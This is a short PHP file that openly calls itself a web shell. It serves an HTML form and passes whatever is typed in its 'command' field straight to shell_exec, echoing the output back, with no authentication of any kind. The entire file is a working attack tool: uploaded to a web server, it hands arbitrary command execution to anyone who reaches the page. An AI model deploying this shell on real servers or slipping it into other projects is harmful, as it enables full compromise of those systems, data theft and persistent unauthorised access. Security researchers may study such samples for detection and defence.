<html>
    <head>
        <title>Webshell</title>
    </head>
    <body>
        <h1>This is a PHP Webshell</h1>
        <form action="webshell.php" method="post" enctype="multipart/form-data">
            <label for="command">Command:</label>
            <input type="text" name="command" id="command" /> 
            <br />
            <input type="submit" name="submit" value="Submit" />
        </form>

        <?php
            if ($_POST['command']) {
                echo '</br>';
                echo '<pre>';
                echo '$ '. $_POST['command'];
                echo '</br>';
                echo shell_exec($_POST['command']);
                echo '</pre>';
            }
        ?>
    </body>
</html>